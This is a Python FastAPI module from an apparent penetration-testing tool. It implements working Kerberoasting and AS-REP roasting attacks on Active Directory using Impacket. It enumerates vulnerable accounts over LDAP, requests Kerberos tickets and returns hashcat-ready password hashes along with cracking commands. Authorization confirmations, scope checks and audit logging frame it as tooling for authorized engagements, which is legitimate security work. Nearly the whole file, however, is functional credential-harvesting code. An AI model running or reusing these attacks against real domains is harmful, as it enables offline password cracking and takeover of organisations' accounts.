"""Kerberoasting + AS-REP Roasting via Impacket.

Both attacks produce hashcat-format crackable material from an AD environment:

  - **Kerberoasting** (mode 13100) — needs *any* valid AD account. We query AD
    for users with `servicePrincipalName` set, then request a TGS for each
    using our TGT. The TGS is encrypted with the service account's password
    hash, so cracking the TGS yields the password.

  - **AS-REP Roasting** (mode 18200) — *no AD account needed*. We send AS-REQs
    without pre-auth for users whose `userAccountControl` has DONT_REQUIRE_PREAUTH
    set. The AS-REP's encrypted-timestamp is hashed from the user's password,
    so we crack that offline.

Both endpoints return strings ready to paste into a `hashcat` invocation.
"""
from __future__ import annotations

import logging
from typing import Any

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel, Field

from lib import audit_log, scope
from lib.mode import get_mode
from lib.ad_auth import CredsModel, domain_to_base_dn, open_ldap
from lib.errors import ErrorCode, MhpError
from lib.validators import validate_domain, validate_hostname

logger = logging.getLogger(__name__)

router = APIRouter(tags=["kerberos-roast"])

# ── Shared impacket setup ───────────────────────────────────────────────────

def _import_impacket():
    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, sendReceive
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import (
            AS_REQ, KERB_PA_PAC_REQUEST, AS_REP,
            seq_set, seq_set_iter,
        )
        from pyasn1.codec.der import decoder, encoder
        return {
            "getKerberosTGT": getKerberosTGT,
            "getKerberosTGS": getKerberosTGS,
            "sendReceive": sendReceive,
            "Principal": Principal,
            "constants": constants,
            "AS_REQ": AS_REQ, "AS_REP": AS_REP,
            "KERB_PA_PAC_REQUEST": KERB_PA_PAC_REQUEST,
            "seq_set": seq_set, "seq_set_iter": seq_set_iter,
            "der_decoder": decoder, "der_encoder": encoder,
        }
    except ImportError as e:
        raise HTTPException(503, f"impacket unavailable: {e}")


# ── Kerberoasting ───────────────────────────────────────────────────────────

class KerberoastBody(BaseModel):
    creds:         CredsModel
    spn_filter:    str = Field("", description="Optional sAMAccountName filter")
    confirm_auth:  bool = Field(False, description="I have authorization to run Kerberos roasting against this domain")
    confirm:       bool = Field(False, description="Re-confirm after a scope warn verdict")
    engagement_id: str | None = Field(None, description="Active engagement id (audit-log + scope)")


@router.post("/kerberoast/run")
def kerberoast(body: KerberoastBody, request: Request) -> dict[str, Any]:
    if not body.confirm_auth:
        raise MhpError(
            "Confirm you have authorization to run Kerberos roasting against this domain.",
            code=ErrorCode.NEED_CONFIRM, status_code=409,
        )
    imp = _import_impacket()
    creds = body.creds
    creds.dc_host = validate_hostname(creds.dc_host, field="dc_host")
    if creds.domain:
        creds.domain = validate_domain(creds.domain, field="domain")
    if not creds.username or (not creds.password and not creds.nt_hash):
        raise HTTPException(400, "Kerberoasting needs valid AD creds (any user)")

    # Engagement scope. The DC host is the network endpoint we'll touch;
    # if a domain is set we prefer it (matches the audit-log target choice).
    scope.enforce_rest(
        creds.domain or creds.dc_host,
        body.engagement_id, get_mode(request),
        confirm=body.confirm,
        active=True, action="kerberoast",
    )

    audit_id: str | None = None
    try:
        audit_id = audit_log.start(
            tool="kerberoast",
            target=creds.domain or creds.dc_host,
            argv=[creds.dc_host, f"spn_filter={body.spn_filter or '*'}"],
            engagement_id=body.engagement_id,
        )
    except Exception:
        logger.exception("audit_log.start failed (continues)")

    # 1) Query AD for accounts with SPNs via LDAP
    try:
        conn = open_ldap(creds)
    except Exception:
        logger.exception("kerberoast LDAP bind failed")
        raise MhpError(
            "LDAP bind failed",
            code=ErrorCode.UNAUTHORIZED,
            status_code=401,
        ) from None
    try:
        base = domain_to_base_dn(creds.domain)
        filt = "(&(objectCategory=person)(servicePrincipalName=*))"
        if body.spn_filter:
            filt = f"(&{filt}(sAMAccountName=*{body.spn_filter}*))"
        conn.search(search_base=base, search_filter=filt,
                    attributes=["sAMAccountName", "servicePrincipalName"])
        targets = [
            {"sam": str(e.sAMAccountName.value),
             "spns": list(e.servicePrincipalName.values)}
            for e in conn.entries
        ]
    finally:
        try: conn.unbind()
        except Exception: pass

    if not targets:
        if audit_id:
            try: audit_log.complete(audit_id, summary="0 SPN-bearing accounts found")
            except Exception: pass
        return {"targets": [], "hashes": [], "message": "No SPN-bearing accounts found."}

    # 2) Get our TGT using the supplied creds
    try:
        nt_hex = creds.nt_hash.lower() if creds.nt_hash else ""
        tgt, cipher, oldSessionKey, sessionKey = imp["getKerberosTGT"](
            imp["Principal"](creds.username,
                             type=imp["constants"].PrincipalNameType.NT_PRINCIPAL.value),
            creds.password if not creds.nt_hash else "",
            creds.domain,
            "" if not nt_hex else bytes.fromhex("a"*32),  # LM ignored
            bytes.fromhex(nt_hex) if nt_hex else b"",
            "",
            creds.dc_host,
        )
    except Exception:
        logger.exception("kerberoast getKerberosTGT failed")
        raise MhpError(
            "could not get TGT",
            code=ErrorCode.UNAUTHORIZED,
            status_code=401,
        ) from None

    # 3) For each SPN target, request a TGS and format the hash
    hashes: list[dict[str, Any]] = []
    for t in targets:
        for spn in t["spns"]:
            try:
                tgs, _, _, _ = imp["getKerberosTGS"](
                    imp["Principal"](spn, type=imp["constants"].PrincipalNameType.NT_SRV_INST.value),
                    creds.domain, creds.dc_host, tgt, cipher, sessionKey,
                )
                # Encode the ticket and lift the encrypted part to build the hashcat string
                from impacket.krb5.asn1 import TGS_REP
                decoded = imp["der_decoder"].decode(tgs, asn1Spec=TGS_REP())[0]
                enc_part = decoded["ticket"]["enc-part"]
                etype = int(enc_part["etype"])
                # hashcat mode 13100 = RC4-HMAC (etype 23). Format:
                # $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<checksum>$<edata>
                cipher_bytes = bytes(enc_part["cipher"])
                if etype == 23:  # RC4 — most common; checksum is first 16 bytes
                    checksum = cipher_bytes[:16].hex()
                    edata = cipher_bytes[16:].hex()
                    hashstr = (f"$krb5tgs$23$*{t['sam']}${creds.domain.upper()}${spn}*"
                               f"${checksum}${edata}")
                else:
                    # AES (17 / 18). Last 12 bytes is HMAC, rest is enc-data.
                    checksum = cipher_bytes[-12:].hex()
                    edata = cipher_bytes[:-12].hex()
                    hashstr = (f"$krb5tgs${etype}$*{t['sam']}${creds.domain.upper()}${spn}*"
                               f"${checksum}${edata}")
                hashes.append({
                    "user": t["sam"], "spn": spn,
                    "etype": etype, "hashcat_mode": 13100 if etype == 23 else 19700,
                    "hash": hashstr,
                })
            except Exception as e:
                hashes.append({"user": t["sam"], "spn": spn,
                               "error": str(e)[:200]})

    if audit_id:
        crackable = sum(1 for h in hashes if h.get("hash"))
        try: audit_log.complete(audit_id, summary=f"{crackable}/{len(hashes)} crackable hashes from {len(targets)} accounts")
        except Exception: pass
    return {
        "targets": targets,
        "hashes": hashes,
        "hashcat_hint": "hashcat -m 13100 hashes.txt wordlist.txt",
    }


# ── AS-REP Roasting ─────────────────────────────────────────────────────────

class AsrepBody(BaseModel):
    creds: CredsModel
    users: list[str] = Field(default_factory=list,
                              description="Specific usernames to try. If empty, "
                              "we LDAP-enumerate users with UF_DONT_REQUIRE_PREAUTH.")
    confirm_auth:  bool = Field(False, description="I have authorization to run AS-REP roasting against this domain")
    engagement_id: str | None = Field(None, description="Active engagement id (audit-log + scope)")


@router.post("/asrep/run")
def asrep_roast(body: AsrepBody) -> dict[str, Any]:
    if not body.confirm_auth:
        raise MhpError(
            "Confirm you have authorization to run AS-REP roasting against this domain.",
            code=ErrorCode.NEED_CONFIRM, status_code=409,
        )
    imp = _import_impacket()
    creds = body.creds
    creds.dc_host = validate_hostname(creds.dc_host, field="dc_host")
    if creds.domain:
        creds.domain = validate_domain(creds.domain, field="domain")
    users: list[str] = list(body.users)

    audit_id: str | None = None
    try:
        audit_id = audit_log.start(
            tool="asrep_roast",
            target=creds.domain or creds.dc_host,
            argv=[creds.dc_host, f"users_supplied={len(users)}"],
            engagement_id=body.engagement_id,
        )
    except Exception:
        logger.exception("audit_log.start failed (continues)")

    # If user didn't supply a list, try to enumerate via LDAP (requires creds)
    if not users:
        if not creds.username or (not creds.password and not creds.nt_hash):
            raise HTTPException(
                400,
                "Provide `users[]` to roast, or supply AD creds so we can "
                "enumerate UF_DONT_REQUIRE_PREAUTH accounts via LDAP.",
            )
        try:
            conn = open_ldap(creds)
        except Exception:
            logger.exception("asrep LDAP bind failed")
            raise MhpError(
                "LDAP bind failed",
                code=ErrorCode.UNAUTHORIZED,
                status_code=401,
            ) from None
        try:
            base = domain_to_base_dn(creds.domain)
            # UAC bit 0x400000 = DONT_REQUIRE_PREAUTH
            conn.search(
                search_base=base,
                search_filter="(&(objectCategory=person)(objectClass=user)"
                              "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                attributes=["sAMAccountName"],
            )
            users = [str(e.sAMAccountName.value) for e in conn.entries]
        finally:
            try: conn.unbind()
            except Exception: pass

    if not users:
        if audit_id:
            try: audit_log.complete(audit_id, summary="0 DONT_REQUIRE_PREAUTH accounts found")
            except Exception: pass
        return {"users": [], "hashes": [], "message":
                "No accounts with DONT_REQUIRE_PREAUTH found."}

    # Build AS-REQ for each user
    hashes: list[dict[str, Any]] = []
    from impacket.krb5.asn1 import AS_REQ, AS_REP
    from datetime import datetime, timedelta
    from random import getrandbits

    for user in users:
        try:
            cname = imp["Principal"](
                user, type=imp["constants"].PrincipalNameType.NT_PRINCIPAL.value)
            sname = imp["Principal"](
                f"krbtgt/{creds.domain}",
                type=imp["constants"].PrincipalNameType.NT_SRV_INST.value)

            req = AS_REQ()
            req["pvno"] = 5
            req["msg-type"] = int(imp["constants"].ApplicationTagNumbers.AS_REQ.value)
            req["padata"] = None  # no pre-auth
            req_body = req["req-body"]
            opts = []
            req_body["kdc-options"] = imp["constants"].encodeFlags(opts)
            imp["seq_set"](req_body, "cname", cname.components_to_asn1)
            imp["seq_set"](req_body, "sname", sname.components_to_asn1)
            req_body["realm"] = creds.domain.upper()
            now = datetime.utcnow()
            req_body["till"] = (now + timedelta(days=1)).strftime("%Y%m%d%H%M%SZ")
            req_body["rtime"] = (now + timedelta(days=1)).strftime("%Y%m%d%H%M%SZ")
            req_body["nonce"] = getrandbits(31)
            supported = [
                imp["constants"].EncryptionTypes.rc4_hmac.value,
                imp["constants"].EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                imp["constants"].EncryptionTypes.aes128_cts_hmac_sha1_96.value,
            ]
            imp["seq_set_iter"](req_body, "etype", supported)
            blob = imp["der_encoder"].encode(req)

            resp = imp["sendReceive"](blob, creds.domain, creds.dc_host)
            decoded = imp["der_decoder"].decode(resp, asn1Spec=AS_REP())[0]
            enc_part = decoded["enc-part"]
            etype = int(enc_part["etype"])
            cipher_bytes = bytes(enc_part["cipher"])
            if etype == 23:  # RC4
                checksum = cipher_bytes[:16].hex()
                edata = cipher_bytes[16:].hex()
                hashstr = (f"$krb5asrep$23${user}@{creds.domain.upper()}:"
                           f"{checksum}${edata}")
                hashes.append({"user": user, "etype": etype,
                               "hashcat_mode": 18200, "hash": hashstr})
            else:
                checksum = cipher_bytes[-12:].hex()
                edata = cipher_bytes[:-12].hex()
                hashstr = (f"$krb5asrep${etype}${user}@{creds.domain.upper()}:"
                           f"{checksum}${edata}")
                hashes.append({"user": user, "etype": etype,
                               "hashcat_mode": 19600, "hash": hashstr})
        except Exception as e:
            err = str(e)
            # KDC_ERR_PREAUTH_REQUIRED → user has pre-auth (not roastable)
            if "KDC_ERR_PREAUTH_REQUIRED" in err:
                hashes.append({"user": user, "error": "PREAUTH_REQUIRED (not roastable)"})
            elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in err:
                hashes.append({"user": user, "error": "user does not exist"})
            else:
                hashes.append({"user": user, "error": err[:200]})

    if audit_id:
        crackable = sum(1 for h in hashes if h.get("hash"))
        try: audit_log.complete(audit_id, summary=f"{crackable}/{len(hashes)} crackable hashes from {len(users)} users")
        except Exception: pass
    return {
        "users": users,
        "hashes": hashes,
        "hashcat_hint": "hashcat -m 18200 hashes.txt wordlist.txt",
    }
